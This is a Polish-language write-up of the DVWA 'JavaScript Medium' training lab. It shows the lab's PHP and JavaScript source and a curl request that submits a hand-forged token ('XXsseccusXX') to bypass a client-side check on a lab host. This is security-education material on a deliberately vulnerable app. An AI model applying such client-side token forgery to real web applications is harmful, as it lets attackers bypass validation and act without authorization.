# Java Script
## Opis techniki
<blockquote> JavaScript pozwala na uruchamianie skryptów w przeglądarce użytkownika. Jest jednocześnie w pełni dostępny dla użytkownika do wglądu. Jeśli nie zastosowano obfuskacji, logika kodu może zostać odczytana i zmodyfikowana. Z tego powodu bezpieczne tworzenie aplikacji webowych wymaga walidacji po stronie serwera.
</blockquote>

## DVWA labs

- [DVWA JavaScript #1 - Medium](#dvwa-javascript-1---medium)

<br/>

## DVWA JavaScript #1 - Medium
Cel: Udane wysłanie słowa 'success'. 

Przy wysłaniu zapytania uruchamiany jest kod JS, który generuje 'token'. Prawidłowa wartość tokenu, która umożliwia wysłanie zapytania to palindrom wybranego tekstu z poprzedzającym i następującym 'XX'. Dla 'success' ta wartość to 'XXsseccusXX', ją podmieniamy w wysyłanym zapytaniu. Efektem jest poprawne przekazanie tekstu.
#### Kod źródłowy `PHP` 

```php

?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/medium.js"></script>
EOF;
?>

```


#### Kod źródłowy `Java Script` 

```javascript
 function do_something(e) {
  for (var t = '', n = e.length - 1; n >= 0; n--) t += e[n];
  return t
}
setTimeout(function () {
  do_elsesomething('XX')
}, 300);
function do_elsesomething(e) {
  document.getElementById('token').value = do_something(e + document.getElementById('phrase').value + 'XX')
}


```
#### Komenda `curl` 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.114.16' -H $'Content-Length: 45' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://10.10.114.16' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://10.10.114.16/vulnerabilities/javascript/' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'security=medium; PHPSESSID=ncmebj2e77vmjisfts0d3p9ke3; security=medium' \
    --data-binary $'token=XXsseccusXX&phrase=success&send=Submit' \
    $'http://10.10.114.16/vulnerabilities/javascript/'
```


#### Efekt działania skryptu:
![image](https://github.com/Jswierczynsk/sandbox/assets/133172137/4b23ce1a-cdee-4433-bb7e-216f234d82ff)

Tekst został poprawnie przekazany.
<br/>
